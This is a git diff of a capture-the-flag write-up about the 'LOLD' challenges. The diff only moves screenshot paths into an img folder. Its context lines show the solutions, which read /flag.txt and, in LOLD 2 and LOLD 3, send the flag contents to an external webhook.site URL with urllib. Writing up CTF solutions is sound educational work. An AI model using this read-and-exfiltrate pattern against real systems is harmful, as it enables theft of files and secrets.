@@ -22,7 +22,7 @@ OK to )
 THING to ()
 ```
 
-![LOLD](LOLD_codium.png)
+![LOLD](img/LOLD_codium.png)
 
 I wrote a LOLD program to print `/flag.txt`
 ```
@@ -36,7 +36,7 @@ print f . read ()
 ```
 and that worked and gaved us the flag
 
-![LOLD](LOLD_terminal.png)
+![LOLD](img/LOLD_terminal.png)
 
 ## Curiosity 
 
@@ -79,8 +79,8 @@ flag = f . read ()
 print urllib . urlopen ( ' https://webhook.site/<REDACTED>?LOLD2= ' + flag ) . read ()
 ```
 
-![LOLD](LOLD2_terminal.png)
-![LOLD](LOLD2_webhook.png)
+![LOLD](img/LOLD2_terminal.png)
+![LOLD](img/LOLD2_webhook.png)
 
 ## LOLD 3 (hard)
 
@@ -101,4 +101,4 @@ flag = f . read ()
 print urllib . urlopen ( ' https://webhook.site/<REDACTED>?LOLD3= ' + flag ) . read ()
 ```
 
-![LOLD](LOLD3_webhook.png)
+![LOLD](img/LOLD3_webhook.png)
